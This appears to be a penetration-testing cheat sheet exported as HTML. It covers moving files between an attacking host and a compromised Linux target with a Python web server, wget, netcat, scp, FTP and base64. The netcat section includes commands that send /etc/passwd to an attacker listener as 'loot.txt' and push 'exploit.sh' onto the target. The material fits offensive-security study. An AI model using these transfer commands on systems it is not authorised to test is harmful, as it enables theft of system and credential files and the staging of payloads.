<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Transferring Files - Linux</h1></strong><br />Thankfully Linux has a few tools built-in that make transferring files fairly trivial.<br /><br /><strong><h2>## Download from Web Server</h2></strong><br />Start a web server on your attacking machine.<br />Python makes this very easy.<br /><div class="codebox"><div class="codebox">mkdir&nbsp;serve;&nbsp;cd&nbsp;serve<br /><br />#&nbsp;For&nbsp;python2,&nbsp;use&nbsp;SimpleHTTPServer<br />python&nbsp;-m&nbsp;SimpleHTTPServer<br /><br />#&nbsp;For&nbsp;python3,&nbsp;use&nbsp;http.server<br />python3&nbsp;-m&nbsp;http.server</div></div><br /><br />You can then download files with <code>wget</code><br /><code>wget http://192.168.1.101/my_file.sh</code><br /><br /><strong><h2>## Transfer files with Netcat</h2></strong><br /><code>&lt;</code> reads files in<br /><code>&gt;</code> reads files out<br /><br />To verify that the file you received is the same as the one sent,<br /><code>md5sum</code> the file before and after sending.<br /><br /><strong><h3>### Listen on target</h3></strong><br />You listen on the target and connect to it from your attacking host.<br /><br />Receive file<br /><div class="codebox"><div class="codebox">#&nbsp;Listen&nbsp;on&nbsp;target&nbsp;and&nbsp;write&nbsp;received&nbsp;data&nbsp;out&nbsp;to&nbsp;&#39;exploit.sh&#39;<br />nc&nbsp;-lvnp&nbsp;9001&nbsp;&gt;&nbsp;exploit.sh<br />#&nbsp;Connect&nbsp;to&nbsp;target&nbsp;from&nbsp;attacking&nbsp;host&nbsp;and&nbsp;send&nbsp;&#39;exploit.sh&#39;&nbsp;file<br />nc&nbsp;10.10.14.12&nbsp;9001&nbsp;&lt;&nbsp;exploit.sh</div></div><br /><br />Serve file<br /><div class="codebox"><div class="codebox">#&nbsp;Listen&nbsp;on&nbsp;target&nbsp;and&nbsp;serve&nbsp;&#39;/etc/passwd&#39;&nbsp;file<br />nc&nbsp;-lvnp&nbsp;9001&nbsp;&lt;&nbsp;/etc/passwd<br />#&nbsp;Connect&nbsp;to&nbsp;target&nbsp;from&nbsp;attacking&nbsp;host&nbsp;and&nbsp;write&nbsp;received&nbsp;data&nbsp;out&nbsp;to&nbsp;&#39;loot.txt&#39;<br />nc&nbsp;10.10.14.12&nbsp;9001&nbsp;&gt;&nbsp;loot.txt</div></div><br /><br /><strong><h3>### Listen on attacking host</h3></strong><br />You listen on the attacking host and connect to it from a shell on the target<br /><br />Receive file<br /><div class="codebox"><div class="codebox">#&nbsp;Listen&nbsp;on&nbsp;the&nbsp;attacking&nbsp;host&nbsp;and&nbsp;write&nbsp;received&nbsp;data&nbsp;out&nbsp;to&nbsp;&#39;exploit.sh&#39;<br />nc&nbsp;-lvnp&nbsp;9001&nbsp;&gt;&nbsp;loot.txt<br />#&nbsp;Connect&nbsp;to&nbsp;attacking&nbsp;host&nbsp;from&nbsp;target&nbsp;and&nbsp;send&nbsp;&#39;/etc/passwd&#39;&nbsp;file<br />nc&nbsp;10.10.14.12&nbsp;9001&nbsp;&lt;&nbsp;/etc/passwd</div></div><br /><br />Serve file<br /><div class="codebox"><div class="codebox">#&nbsp;Listen&nbsp;on&nbsp;the&nbsp;attacking&nbsp;host&nbsp;and&nbsp;serve&nbsp;&#39;exploit.sh&#39;&nbsp;file<br />nc&nbsp;-lvnp&nbsp;9001&nbsp;&lt;&nbsp;exploit.sh<br />#&nbsp;Connect&nbsp;to&nbsp;attacking&nbsp;host&nbsp;from&nbsp;target&nbsp;and&nbsp;write&nbsp;received&nbsp;data&nbsp;out&nbsp;to&nbsp;&#39;exploit.sh&#39;<br />nc&nbsp;10.10.14.12&nbsp;9001&nbsp;&gt;&nbsp;exploit.sh</div></div><br /><br /><strong><h2>## SSH/SCP</h2></strong><br />SCP stands for Secure Copy.<br />It uses the same authentication as SSH does, so if you can <code>ssh</code> into a box you can <code>scp</code> files.<br /><a href="http://www.hypexr.org/linux_scp_help.php">http://www.hypexr.org/linux_scp_help.php</a><br /><br />Copy a file to the target<code><br />scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext<br /></code>Copy a directory to the target with <code>-r<br />scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination</code><br /><br /><strong><h2>## FTP</h2></strong><br />Start an ftp server on attacking host with <code>-w</code> to grant write access<br /><code>python -m pyftpdlib -p 21 -w</code><br />Specify a username and password to prevent anonymous login<br /><code>python -m pyftpdlib -p 21 -w -u wesker -P evil</code><br /><br />If you have an interactive session on the target Linux box, you can connect with <code>ftp</code><br /><code>ftp 10.11.0.42</code><br /><code>get &lt;file&gt;</code><br /><code>exit</code><br /><br /><strong><h2>## Base64 encode binary &amp; copy/paste</h2></strong><br />If you can only copy/paste and want to transfer a binary, <br />you can base64 encode a compiled binary, copy/paste the base64, and then decode the base64.<br />You&#39;ll have yourself a binary.<br /><br />Don&#39;t rely on this.<br />Copy and pasting large amounts of data isn&#39;t very reliable.<br /><br />1. Base64 encode binary<br /><code>cat binary | base64 &gt; binary.b64</code><br /><br />2. Copy/paste the base64 to the target machine<br />(be patient because you&#39;re effectively copying a 1/2mb file, avoid doing this for large files)<br /><code>nano binary.b64</code><br /><br />3. On target machine, decode the base64 to a file<br /><code>cat binary.b64 | base64 -d &gt; binary</code><br /></div>
</body>
</html>
